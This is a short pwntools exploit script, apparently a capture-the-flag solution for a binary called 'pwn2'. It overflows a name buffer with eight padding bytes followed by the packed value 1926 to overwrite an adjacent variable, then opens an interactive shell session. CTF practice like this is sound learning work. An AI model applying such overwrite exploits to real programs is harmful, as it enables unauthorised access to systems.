from pwn import *		
context(log_level='debug',os='linux',arch='amd64')

#pwnfile = 
io=process('./pwn2')	# ,aslr = False

#io=remote('172.0.0.1',33903)

def debug():
	gdb.attach(io,"b *0x04008D9")
	pause()

#debug()



io.recvuntil("What's Your Birth?")
io.sendline(b'1111')	


pay = b'a'*8+p32(1926)	#b'b'*4 # + p32(1926) # b'\x86\x07'   # + p32(1926)   0x786 
io.sendlineafter("What's Your Name?",pay)



io.interactive()
